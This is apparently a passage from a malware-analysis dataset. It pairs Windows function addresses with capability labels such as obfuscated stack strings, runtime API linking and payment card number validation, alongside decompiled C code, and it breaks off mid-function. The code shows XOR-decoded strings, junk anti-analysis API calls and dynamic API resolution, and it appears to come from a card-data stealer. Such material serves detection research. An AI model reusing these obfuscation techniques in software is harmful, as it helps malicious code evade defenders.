        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.00404364(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ah;\n    uint var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_26h;\n    uint var_22h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_48h = 0x392e5513;\n    var_44h = 0x4c31725b;\n    var_40h._0_1_ = 0x5c;\n    var_40h._1_1_ = 0x38;\n    stack0xffffffbe = 0x392b5514;\n    var_3ah = 0x4c3c7250;\n    var_36h._0_1_ = 0x53;\n    stack0xffffffc8 = 0x39205519;\n    var_30h = 0x4c3b7255;\n    var_2ch._0_1_ = 0x56;\n    stack0xffffffd2 = 0x393d5502;\n    var_26h = 0x4c26724a;\n    var_22h._0_1_ = 0x4d;\n    stack0xffffffdc = 0x393a5507;\n    var_1ch = 0x4c2d724f;\n    var_18h._0_1_ = 0x40;\n    stack0xffffffe6 = 0x394c5508;\n    var_10h = 0x394c5572;\n    var_36h._1_1_ = var_40h._1_1_;\n    var_2ch._1_1_ = var_40h._1_1_;\n    var_22h._1_1_ = var_40h._1_1_;\n    var_18h._1_1_ = var_40h._1_1_;\n    var_ch._0_1_ = var_40h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_48h - iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar5 != 0xf2f09f) {\n            var_4h = 0x5;\n            *(iVar8 + iVar4) = *(&var_10h + iVar8 % 5) ^ (iVar8 + iVar4)[var_8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar6 = fcn.00404211();\n    puVar7 = uVar6 % 0x38 + 8;\n    var_10h = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar3 = (*pcVar1)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar2 = var_10h;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar9 = puVar7;\n            for (iVar8 = var_8h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (var_10h != NULL) {\n                do {\n                    iVar8 = fcn.00404211();\n                    *(puVar7 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar2);\n            }\n            *(puVar7 + puVar2 * 2) = 0;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar7;\n}\n",
        "token_count": 1098
    },
    "0040512a": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040512a(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x7a) &&\n           (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar4,  puVar4 != NULL)) {\n            iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n            if ((iVar3 != 0) &&\n               ((iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid),  iVar3 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x57646811;\n                var_30h = 0x686f4e7b;\n                var_2ch = 0x4e67577c;\n                var_28h = 0x57716873;\n                var_24h._0_2_ = 0x4e4a;\n                var_20h = 0x57496842;\n                var_1ch._0_2_ = 0x4e4a;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                do {\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                    if (iVar5 != 0xff2951) {\n                        var_10h = 6;\n                        *(iVar6 + iVar3) = *(&var_20h + iVar6 % 6) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x12);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                iVar6 = var_14h;\n                if (iVar5 == 0) {\n                    iVar6 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 876
    },
    "00405b09": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __fastcall fcn.00405b09(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uchar *ARG_0;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_50h = 0x3c151c02;\n    iVar6 = 8;\n    puVar8 = &var_28h;\n    var_14h = param_2;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_4ch = 0x1c26581c;\n    var_48h = 0x5e3a1f12;\n    puVar8 = &var_40h;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_44h = 0x6c121c28;\n    var_20h = 0x6c617945;\n    puVar8 = &var_38h;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_1ch._0_2_ = 0x376e;\n    puVar8 = &var_30h;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar6 = 0;\n    ARG_0 = &var_50h - iVar5;\n    var_8h = iVar5;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar2 != 0x667b68) {\n            *(iVar6 + iVar5) = *(&var_20h + iVar6 % var_4h) ^ (iVar6 + iVar5)[ARG_0];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    var_50h = 0x23101c5e;\n    var_4ch = 0x504a5950;\n    var_48h = 0x15595163;\n    var_44h = CONCAT31(var_44h._1_3_, 0x62);\n    var_20h = 0x4d627935;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x35);\n    uVar1 = (*pcVar4)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    var_18h = iVar5;\n    ARG_0 = &var_50h - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        iVar2 = var_8h;\n        if (iVar3 != 0x2d0487) {\n            ARG_0 = 0x5;\n            *(iVar6 + iVar5) = *(&var_20h + iVar6 % 5) ^ (&var_50h - iVar5)[iVar6 + iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_8h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar4 != NULL) {\n        iVar6 = (*pcVar4)(var_10h, &var_28h, &var_40h, &var_38h, &var_30h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar6 != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_50h = 0x54661715;\n            var_4ch = 0x5e480d00;\n            var_48h = 0x4d08416e;\n            puVar7 = ARG_0;\n            for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_44h = CONCAT31(var_44h._1_3_, 0x30);\n            var_20h = 0x714b7330;\n            var_1ch._0_2_ = 0x3530;\n            uVar1 = (*pcVar4)(8, 0xe);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_10h = &var_50h - iVar5;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                puVar7 = ARG_0;\n                if (iVar2 != 0x346f6b) {\n                    *(iVar6 + iVar5) = *(&var_20h + iVar6 % var_4h) ^ (iVar6 + iVar5)[&var_50h - iVar5];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, iVar5, var_14h, var_24h, var_28h);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar5 = var_18h;\n            iVar2 = var_8h;\n            goto code_r0x00405d16;\n        }\n    }\n    puVar7 = NULL;\ncode_r0x00405d16:\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return puVar7;\n}\n",
        "token_count": 1739
    },
    "00407463": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00407463(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_2ch = 0x21340719;\n    var_28h = 0x3340663c;\n    var_24h = 0x1133243c;\n    var_20h._0_2_ = 0x3d10;\n    var_20h._2_1_ = 0x4b;\n    var_1ch = 0x4e637450;\n    var_18h._0_1_ = 0x4b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_8h = 5;\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    var_10h = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar5 != 0xd28946) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xf);\n    var_2ch = 0x23101c5e;\n    var_28h = 0x504a5950;\n    var_24h = 0x15595163;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x62);\n    var_1ch = 0x4d627935;\n    var_18h._0_1_ = 0x35;\n    uVar3 = (*pcVar1)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        iVar5 = var_10h;\n        if (iVar6 != 0x2d0487) {\n            *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n    *0x41e200 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    if (*0x41e200 != NULL) {\n        iVar7 = (**0x41e200)(var_14h, &var_4h);\n        var_4h = -(iVar7 != 0) & var_4h;\n    }\n    uVar2 = var_4h;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 930
    },
    "0040771e": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040771e(uint *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *dwProcessId;\n    uint pSessionId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint dwBytes;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    dwProcessId = param_1;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar6)(8, 0x208);\n    var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    dwBytes = 0;\n    pSessionId = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &dwBytes);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*pcVar6)(8, dwBytes);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar1)(TokenHandle, 1, dwProcessId, dwBytes, &dwBytes);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar5 != 0) {\n                                    var_60h = 0x6f767102;\n                                    var_5ch = 0x33225118;\n                                    var_58h = 0x711e4b26;\n                                    var_54h = 0x51716f7d;\n                                    var_50h = 0x4b33332d;\n                                    var_4ch = 0x6f407174;\n                                    var_48h = 0x33545117;\n                                    var_44h = 0x710d4b1c;\n                                    var_40h = 0x512f6f16;\n                                    var_3ch._0_2_ = 0x3371;\n                                    var_38h = 0x6f337151;\n                                    var_34h._0_1_ = 0x4b;\n                                    uVar2 = (*pcVar6)(8, 0x4d);\n                                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar8 = 0;\n                                    do {\n                                        iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n                                        if (iVar4 != 0x1fd7cc) {\n                                            var_1ch = 5;\n                                            *(iVar8 + iVar5) =\n                                                 *(&var_38h + iVar8 % 5) ^ (iVar8 + iVar5)[&var_60h - iVar5];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar5, var_ch, var_10h, pSessionId);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar6)(0, dwProcessId);\n                            (*pcVar7)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar2);\n        uVar2 = (*pcVar6)(0, puVar3);\n        (*pcVar7)(uVar2);\n        uVar2 = var_1ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 1511
    },
    "0040862e": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040862e(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x181a5e02;\n    var_20h = 0x395b353f;\n    var_1ch = 0x4e262f19;\n    var_18h._0_1_ = 0x68;\n    var_14h = 0x6c683754;\n    var_10h._0_1_ = 0x4a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4h = 5;\n    iVar7 = 0;\n    var_ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar5 != 0x14293b) {\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % var_4h) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_24h = 0x23101c5e;\n    var_20h = 0x504a5950;\n    var_1ch = 0x15595163;\n    var_18h._0_1_ = 0x62;\n    var_14h = 0x4d627935;\n    var_10h._0_1_ = 0x35;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        iVar5 = var_ch;\n        if (iVar6 != 0x2d0487) {\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % var_4h) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_ch);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 792
    },
    "004088c1": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004088c1(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41da80;\n    var_14h = param_1;\n    if (*0x41dd24 == NULL) {\n        var_4ch = 0x55132d27;\n        var_48h._0_2_ = 0x354c;\n        var_48h._2_1_ = 0x2c;\n        var_8h = 5;\n        var_48h._3_1_ = 5;\n        var_44h = 0x15151401;\n        var_40h = 0x444e140b;\n        var_3ch = 0x1d311704;\n        var_38h = 0x6162b14;\n        var_34h = 0xb2b041b;\n        var_30h._0_2_ = 0x780d;\n        var_1ch = 0x63644270;\n        var_18h._0_1_ = 0x78;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_10h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n            if (iVar4 != 0xc91678) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_4ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_2ch = 0x23101c5e;\n        var_28h = 0x504a5950;\n        var_24h = 0x15595163;\n        var_20h._0_1_ = 0x62;\n        var_1ch = 0x4d627935;\n        var_18h._0_1_ = 0x35;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n            iVar4 = var_10h;\n            if (iVar5 != 0x2d0487) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_2ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_10h);\n        *0x41dd24 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n        pcVar6 = *0x41dd24;\n        if (*0x41dd24 == NULL) goto code_r0x00408a33;\n    }\n    iVar3 = var_14h;\n    pcVar6 = (**0x41dd24)(var_14h);\n    if (pcVar6 != '\\0') {\n        *0x41da80 = iVar3 != 0;\n    }\ncode_r0x00408a33:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1137
    },
    "00409b94": {
        "rules": [
            "contain obfuscated stackstrings",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00409b94(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar4;\n    code *pcVar5;\n    ushort var_80h;\n    uchar var_7eh;\n    uint var_7dh;\n    uint var_78h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_45h;\n    uint var_41h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar4 = 8;\n    lpString2 = param_1;\n    hHeap = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, hHeap * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_8h = iVar2;\n            uVar1 = (*pcVar5)(8, hHeap * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_18h = fcn.0040b17e();\n                var_18h = var_18h + 2;\n                var_34h = 0x535f4972;\n                var_30h = 0x4979673b;\n                var_2ch = 0x672f5351;\n                var_28h = 0x53334923;\n                var_24h = 0x53334957;\n                var_20h._0_2_ = 0x674e;\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                var_14h = 6;\n                iVar4 = 0;\n                var_1ch = iVar2;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n                    if (iVar3 != 0x942dc5) {\n                        *(iVar4 + iVar2) = *(&var_24h + iVar4 % var_14h) ^ (iVar4 + iVar2)[&var_34h - iVar2];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_18h, iVar2, uVar1);\n                (*pcVar5)(hHeap, 